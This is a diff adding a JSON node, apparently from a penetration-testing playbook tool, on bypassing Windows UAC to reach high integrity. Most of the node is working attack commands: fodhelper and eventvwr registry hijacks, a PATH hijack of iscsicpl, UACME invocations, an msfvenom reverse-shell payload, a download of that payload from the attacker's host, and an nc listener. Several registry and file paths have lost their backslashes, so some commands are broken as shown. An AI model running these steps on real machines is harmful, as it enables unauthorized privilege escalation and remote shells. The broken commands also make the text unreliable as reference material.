@@ -1,0 +1,22 @@
+{
+  "id": "win_uac_bypass",
+  "phase": "WINDOWS",
+  "title": "UAC Bypass — Medium to High Integrity",
+  "body": "In Administrators group but commands fail? UAC is blocking medium integrity. Bypass to elevate to high integrity without a GUI prompt. Requires local admin group membership. Reference: MITRE T1548.002, LOLBAS Project (lolbas-project.github.io).",
+  "cmd": "# -- CONFIRM UAC IS THE ISSUE -------------\nwhoami /groups | findstr /i \"mandatory|integrity\"\n# Medium Mandatory Level = UAC restricting you\n# High Mandatory Level = already elevated, not UAC\n\n# -- METHOD 1: FODHELPER (Win 10/11) ------\n# Pure registry — no binary needed\nNew-Item -Path \"HKCU:SoftwareClassesms-settingsShellOpencommand\" -Force\nNew-ItemProperty -Path \"HKCU:SoftwareClassesms-settingsShellOpencommand\"   -Name \"DelegateExecute\" -Value \"\"\nSet-ItemProperty -Path \"HKCU:SoftwareClassesms-settingsShellOpencommand\"   -Name \"(default)\" -Value \"C:WindowsTempshell.exe\"\nStart-Process \"C:WindowsSystem32\fodhelper.exe\"\n\n# Cleanup\nRemove-Item \"HKCU:SoftwareClassesms-settings\" -Recurse -Force\n\n# -- METHOD 2: EVENTVWR (older Windows) ---\nNew-Item \"HKCU:SoftwareClassesmscfileshellopencommand\" -Force\nSet-ItemProperty \"HKCU:SoftwareClassesmscfileshellopencommand\"   \"(default)\" \"C:WindowsTempshell.exe\"\nStart-Process \"C:WindowsSystem32eventvwr.exe\"\n\n# -- METHOD 3: CMSTP.EXE ------------------\n# Requires crafted .inf file\n# Reference: MITRE T1218.003\n\n# -- METHOD 4: ISCSICPL.EXE (reliable, Win 10/11) -----\n# iscsicpl.exe is auto-elevated — hijack via PATH\n# Step 1: create payload on Kali\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o iscsicpl.exe\n\n# Step 2: create writable dir, drop fake binary\nmkdir C:\\Windows\\Temp\\uac\niwr http://$lhost/iscsicpl.exe -OutFile C:\\Windows\\Temp\\uac\\iscsicpl.exe\nUnblock-File C:\\Windows\\Temp\\uac\\iscsicpl.exe\n\n# Step 3: prepend dir to PATH for this session\n$env:PATH = \"C:\\Windows\\Temp\\uac;\" + $env:PATH\n\n# Step 4: launch iscsicpl — auto-elevates and finds\n# your fake binary first in PATH\nStart-Process iscsicpl\n\n# -- METHOD 5: CONFIGURATION MANAGER (GUI/RDP) ----------\n# If you have RDP access:\n# 1. Win+R -> type: msconfig -> Enter\n# 2. UAC prompt appears — click Show Details\n# 3. In the msconfig window: Tools tab\n# 4. Select \"Command Prompt\" -> click Launch\n# 5. This cmd runs at HIGH integrity — no prompt!\n# Alternative: Win+R -> eventvwr -> File -> Run task\n#   as administrator — browse to cmd.exe\n\n# -- METHOD 6: UACME ----------------------\n# 60+ bypass methods, regularly updated\n# github.com/hfiref0x/UACME\n.\\Akagi64.exe 33 C:\\Windows\\Temp\\shell.exe\n.\\Akagi64.exe 61 C:\\Windows\\Temp\\shell.exe\n\n# -- LISTENER -----------------------------\nnc -nlvp $lport",
+  "warn": "If whoami /groups shows you are NOT in the Administrators group — UAC bypass won't help. You need actual privilege escalation first, not just integrity elevation. These are different problems.",
+  "choices": [
+    {
+      "label": "High integrity shell achieved",
+      "next": "got_root_windows"
+    },
+    {
+      "label": "Not in Administrators — wrong path",
+      "next": "winpeas"
+    },
+    {
+      "label": "Try token impersonation instead",
+      "next": "token_privs"
+    }
+  ]
+}
